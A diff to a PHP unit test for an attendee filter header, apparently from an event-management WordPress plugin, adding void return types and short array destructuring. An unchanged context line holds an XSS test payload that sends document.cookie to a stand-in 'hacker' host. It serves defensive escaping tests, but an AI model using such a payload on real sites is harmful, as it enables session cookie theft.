@@ -31,7 +31,7 @@ class AttendeeFilterHeaderTest extends TestCase
     private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';
 
 
-    public static function setUpBeforeClass()
+    public static function setUpBeforeClass(): void
     {
         require_once EE_ADMIN . 'EE_Admin_Page.core.php';
         if (! defined('REG_ADMIN_URL')) {
@@ -49,7 +49,7 @@ class AttendeeFilterHeaderTest extends TestCase
      * @throws ReflectionException
      * @since 4.10.2.p
      */
-    public function setUp()
+    public function setUp(): void
     {
         $this->setUpAttendee();
     }
@@ -166,7 +166,7 @@ class AttendeeFilterHeaderTest extends TestCase
      */
     public function testGetHeaderText()
     {
-        foreach ($this->testDataGenerator() as list($get_params, $expected)) {
+        foreach ($this->testDataGenerator() as [$get_params, $expected]) {
             $this->assertInstanceOf('EE_Attendee', $this->attendee);
             $attendee_filter_header = $this->getAttendeeFilterHeader($get_params);
             $header_text = $attendee_filter_header->getHeaderText();
